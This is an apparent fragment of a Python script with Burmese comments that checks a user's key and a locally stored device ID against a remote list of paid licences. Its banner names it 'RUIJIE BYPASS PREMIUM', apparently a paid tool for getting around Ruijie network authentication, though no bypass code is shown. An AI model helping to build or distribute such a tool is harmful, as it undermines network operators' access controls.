def get_hwid():
    """Device ID (HWID) ကို ထုတ်ယူခြင်း သို့မဟုတ် အသစ်ဆောက်ခြင်း"""
    id_file = os.path.expanduser("~/.zyan_hwid")
    if os.path.exists(id_file):
        with open(id_file, "r") as f:
            return f.read().strip()
    
    new_id = f"ZYAN-{str(uuid.uuid4()).split('-')[0].upper()}"
    with open(id_file, "w") as f:
        f.write(new_id)
    return new_id

def verify_access():
    """Key, HWID နှင့် Expiry Date အားလုံးကို စစ်ဆေးခြင်း"""
    my_hwid = get_hwid()
    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{MAGENTA}    RUIJIE BYPASS PREMIUM - AUTHENTICATION{RESET}")
    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{WHITE}[#] YOUR DEVICE ID: {YELLOW}{my_hwid}{RESET}")
    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    
    user_key = input(f"{WHITE}[?] Enter Your Premium Key: {RESET}").strip()
    
    if not user_key:
        print(f"{RED}[!] Key cannot be empty!{RESET}")
        return False

    print(f"{YELLOW}[*] Validating with server...{RESET}", end="\r")
    
    try:
        today = datetime.date.today()
        response = requests.get(KEY_URL, timeout=15)
        
        if response.status_code == 200:
            lines = response.text.splitlines()
            for line in lines:
                if "|" in line:
                    # Format: Key|HWID|YYYY-MM-DD
                    parts = line.split("|")
                    if len(parts) == 3:
                        db_key, db_hwid, db_exp = [p.strip() for p in parts]
                        
                        if user_key == db_key and my_hwid == db_hwid:
                            exp_date = datetime.datetime.strptime(db_exp, "%Y-%m-%d").date()
                            
                            if today <= exp_date:
                                remaining = (exp_date - today).days
                                print(f"{GREEN}[✓] Access Granted! ({remaining} days remaining)   {RESET}")
                                time.sleep(1.5)
                                return True
                            else:
                                print(f"{RED}[X] Key Expired on {db_exp}!               {RESET}")
                                return False
            
            print(f"{RED}[X] Invalid Key or Device ID! Access Denied.      {RESET}")
            return False
        else:
            print(f"{RED}[!] Server Error: {response.status_code}              {RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Verification Failed: Check your connection.      {RESET}")
        return False

